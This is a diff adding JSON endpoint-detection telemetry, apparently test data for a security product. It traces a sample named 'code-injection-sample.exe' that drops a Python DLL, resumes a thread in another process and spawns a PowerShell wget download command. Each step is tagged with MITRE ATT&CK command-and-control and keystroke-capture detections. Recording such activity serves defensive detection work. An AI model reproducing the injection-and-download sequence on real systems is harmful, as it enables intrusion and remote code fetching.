+            "productId": "",
+            "description": ""
+        },
+        {
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "File Created",
+            "fileAttributes": {
+                "creationDate": "2024-09-24T13:18:04.507Z",
+                "embedFileVersion": "2.7.15",
+                "embedFilename": "python27.dll",
+                "embedProductName": "Python",
+                "embedProductVersion": "2.7.15",
+                "embedVendorName": "Python Software Foundation",
+                "fileType": "PE",
+                "fsattrs": 32,
+                "lastModificationDate": "2024-09-24T13:18:04.507Z",
+                "md5": "076A8A0DD3BEC1B61110B87A989C994F",
+                "name": "python27.dll",
+                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\_MEI82522\\python27.dll",
+                "sha1": "B6771A7B63B106C3FCCBF8C0477952758109A724",
+                "sha256": "65C735B2E427755241BFA61BC3249D7169B63E49B314EB9405C6BCF74AFB8754",
+                "size": 3428864
+            },
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.PECreated"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.520Z",
+            "traceId": "42f726e2-78f3-4187-9fd1-f1b338b5a95c",
+            "uniqueRuleId": 21,
+            "version": "3.0",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "api": {
+                "arguments": [
+                    "0x1c8"
+                ],
+                "moduleName": "",
+                "name": "ResumeThread",
+                "result": "1",
+                "targetPid": 7432,
+                "targetProcessFull": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe"
+            },
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "Api",
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "EAA94C9E35D2EE3C003A4F636D5B67DF9644BB97D54325CD43E93FE10CB95146",
+            "parentTraceId": "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+            "pid": 8252,
+            "ppid": 8252,
+            "rv": 4528,
+            "tags": [
+                "@AC.APICall"
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.523Z",
+            "traceId": "e5444813-c1d2-45b3-ae7c-743238585911",
+            "uniqueRuleId": 19115,
+            "version": "3.0",
+            "action": "",
+            "productId": "",
+            "description": ""
+        },
+        {
+            "cmdLine": "powershell.exe \"wget https://www.google.com\"",
+            "cmdLineMd5": "29876FE00408F997AC4C0D4A5885CBEE",
+            "cmdLineSha1": "D491B1C0478190EBDEF2F7B8D666AADA6F6D3663",
+            "cmdLineSha256": "A54A02D1610505847427B56569953E80A80B8A2234D325A825B663D93DB34A0C",
+            "contextTraceId": "3896e434-f47a-42c1-aae0-29e54b5c2f97",
+            "detectionDate": "2024-09-24T13:18:18Z",
+            "dtsId": "EDR",
+            "dtsType": "all",
+            "eventType": "Process Created",
+            "h_os": "windows",
+            "h_tp": "mar_4.2.1.4528",
+            "h_traceType": "all",
+            "h_version": "3.0",
+            "host": "7ZFW10RS5X64",
+            "integrity": 3,
+            "interpreter": "powershell",
+            "it": 1,
+            "maGuid": "DF436252-767A-11EF-1B6F-005056A4FDFF",
+            "nonpeType": "commandline",
+            "pFullName": "C:\\Users\\cdaauto\\Desktop\\code-injection-sample.exe",
+            "pSha2": "DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+            "parentTraceId": "c53abccc-0278-4580-b74c-7112da49ff6b",
+            "parentsTraceId": [
+                "c53abccc-0278-4580-b74c-7112da49ff6b",
+                "8e0ae8e5-dd6c-4692-9abd-a082b20e020d",
+                "1a017f04-231b-4eaf-b3da-126da184ce99"
+            ],
+            "pid": 8196,
+            "ppid": 7432,
+            "procFileAttrs": {
+                "creationDate": "2018-09-15T07:29:54.998Z",
+                "embedFileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
+                "embedFilename": "PowerShell.EXE",
+                "embedProductName": "Microsoft® Windows® Operating System",
+                "embedProductVersion": "10.0.17763.1",
+                "embedVendorName": "Microsoft Corporation",
+                "md5": "7353F60B1739074EB17C5F4DDDEFE239",
+                "name": "powershell.exe",
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "reputation": {
+                    "reputation": 99,
+                    "vtpPrivileges": 1
+                },
+                "sha1": "6CBCE4A295C163791B60FC23D285E6D84F28EE4C",
+                "sha256": "DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+                "size": 448000,
+                "subsystem": 3
+            },
+            "processName": "powershell.exe",
+            "rv": 4528,
+            "tags": [
+                "@AC.AdminHackingToolExecuted",
+                "@AC.ProcessCreated"
+            ],
+            "tdmRuleIds": [
+                99,
+                100000,
+                100007,
+                100009
+            ],
+            "tenantId": "9AC56A98-FD6D-4C4F-BD8B-3E58CAAC30BE",
+            "time": "2024-09-24T13:18:04.621Z",
+            "traceId": "200acee5-6a21-49ba-9762-85c652fd16f8",
+            "user": {
+                "domain": "CDA",
+                "id": "S-1-5-21-2561662139-2012859153-108931552-1137",
+                "name": "cdaauto"
+            },
+            "version": "3.0",
+            "severity": "s1",
+            "detectionsSets": [
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.CommandAndControl",
+                        "@ATE.T1059.001",
+                        "@ATE.T1105",
+                        "@ATE.T1071.001",
+                        "@MSI._process_pswebrequest_remotecopy"
+                    ]
+                },
+                {
+                    "sev": "s0",
+                    "tags": [
+                        "@ATA.Execution",
+                        "@ATA.CredentialAccess",
+                        "@ATA.Collection",
+                        "@ATE.T1106",
+                        "@ATE.T1056.001",
+                        "@ATE.T1056.004",
+                        "@MSI._Api_Keystate_Capturehook"
+                    ]
+                },
+                {
+                    "sev": "s1",
+                    "tags": [
+                        "@ATA.CommandAndControl",
+                        "@ATE.T1105",
+                        "@ATE.T1071.001",
+                        "@MSI._process_copy_file_wget"
+                    ]
+                }
+            ],
+            "endTime": null,
+            "originalSeverity": "s1",
+            "processCharacteristics": "",
+            "contained": "no",
+            "flagged": false,
+            "containedBy": "",
+            "summary": [
+                {
+                    "attribute": "cmdline",
+                    "attributeKey": "cmdLine",
+                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
+                    "summarizable": true,
+                    "shouldDisplayReadMore": true,
+                    "shouldDisplayCopyToClipboard": true
+                },
+                {
+                    "attribute": "domainName",
+                    "attributeKey": "user.domain",
+                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
+                    "summarizable": true
+                },
+                {
+                    "attribute": "user",
+                    "attributeKey": "user.name",
+                    "label": "TRACE_TIMELINE.DETAILS.USER",
+                    "links": [
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
+                            "searchTarget": [
+                                "${maGuid}"
+                            ],
+                            "searchHostname": [
+                                "${hostname}"
+                            ],
+                            "drillDownKey": "PROCESS_USER_ONE",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "Processes",
+                                        "outputs": [
+                                            "id",
+                                            "name",
+                                            "cmdline",
+                                            "parentid",
+                                            "parentname",
+                                            "sha1",
+                                            "md5",
+                                            "user"
+                                        ]
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "Processes",
+                                                    "output": "user",
+                                                    "op": "ENDS_WITH",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        },
+                        {
+                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
+                            "searchQuery": {
+                                "projections": [
+                                    {
+                                        "name": "HostInfo",
+                                        "outputs": [
+                                            "hostname",
+                                            "ip_address"
+                                        ]
+                                    },
+                                    {
+                                        "name": "LoggedInUsers"
+                                    }
+                                ],
+                                "condition": {
+                                    "or": [
+                                        {
+                                            "and": [
+                                                {
+                                                    "name": "LoggedInUsers",
+                                                    "output": "username",
+                                                    "op": "EQUALS",
+                                                    "value": "${user}"
+                                                }
+                                            ]
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    ],
+                    "summarizable": true
+                }
+            ],
+            "pidTraceId": "200acee5-6a21-49ba-9762-85c652fd16f8",
+            "lastActivityTime": "2024-09-24T13:18:04.621Z",
+            "reputationInfo": {
+                "reason": ""
+            }
+        }
+    ]
+}
